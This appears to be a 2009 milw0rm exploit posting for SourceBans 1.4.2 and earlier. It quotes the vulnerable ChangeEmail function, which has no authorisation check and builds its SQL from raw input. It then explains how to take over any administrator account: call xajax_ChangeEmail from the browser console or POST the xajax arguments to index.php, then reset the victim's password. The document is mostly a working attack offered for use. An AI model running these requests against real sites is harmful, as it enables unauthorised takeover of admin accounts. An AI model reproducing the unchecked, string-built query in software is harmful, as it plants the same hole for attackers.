@@ -1,0 +1,38 @@
+Sourcebans (PHP) (sb-callback.php)
+Author: Mr. Anonymous
+------
+Vendor:http://www.sourcebans.com
+Affected Versions: <= 1.4.2
+-----
+Exploit (sb-callback lines 185-204):
+-------------
+function ChangeEmail($aid, $email)
+{	
+	...SNIP...
+	
+	$GLOBALS['db']->Execute("UPDATE `".DB_PREFIX."_admins` SET `email` =
+'".$email."' WHERE `aid` = '".$aid."'");
+	$objResponse->addScript("ShowBox('E-mail address changed', 'Your
+E-mail address has been changed successfully.', 'green',
+'index.php?p=account', true);");
+	$log = new CSystemLog("m", "E-mail Changed", "E-mail changed for
+admin (".$aid.")");
+	return $objResponse;
+}
+-------
+How to Exploit
+-------
+No checking is done to verify you own that email address.  You can
+simply submit a post request with the following arguments, to change
+any admins email with your own (or a temporary one), and then reset
+their password, then get full admin access.
+
+You can download firebug for firefox, and simply run in the console
+"xajax_ChangeEmail(ADMIN_ID, EMAIL_TO_CHANGE_TO)", otherwise you need
+to send these variables to index.php via POST:
+
+xxajax: ChangeEmail
+xajaxargs[]: ADMIN_ID
+xajaxargs[]: EMAIL_TO_CHANGE_TO
+
+# milw0rm.com [2009-06-22]
